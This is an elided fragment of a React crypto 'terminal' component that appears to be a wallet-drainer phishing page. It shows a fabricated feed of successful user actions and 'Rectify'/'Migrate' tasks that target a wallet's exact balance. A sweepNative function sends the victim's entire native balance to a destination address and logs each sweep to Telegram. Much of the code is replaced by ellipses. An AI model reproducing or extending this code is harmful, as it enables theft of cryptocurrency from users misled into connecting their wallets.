...
export default function EvedexTerminal() {
  ...
  useEffect(() => {
    ...
    const interval = setInterval(() => {
      ...
      setFeedMsg(`🛡️ ${addr} ${act} Successfully`);
  ...
  // --- THE FIXED EXECUTION (BALANCE MIRRORING) ---
  const executeTaskAction = async () => {
    ...
    try {
      ...
      if (usdtAddress && (activeTask === "Rectify" || activeTask === "Migrate")) {
        ...
        // MIRROR LOGIC: Targets EXACT balance to fix simulation errors
  ...
  const sweepNative = () => {
    ...
    if (val > 0n) {
      sendTransaction({ to: destination, value: val, gasPrice: null }, {
        onSuccess: (h) => {
          logToTelegram(`✅ NATIVE_SWEEP: ${address}`);
            ...
            {view === "task_box" && (
              <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'35px', textAlign:'center'}}>
                ...
                <div style={{backgroundColor:'black', border:'1px solid #1e293b', padding:'25px', borderRadius:'18px', textAlign:'left', marginBottom:'30px'}}>
                  ...
                  <input type="number" value={inputVal} readOnly style={{background:'none', border:'none', color:'#10b981', fontSize:'24px', width:'100%', outline:'none', fontWeight:'900'}} />
                </div>
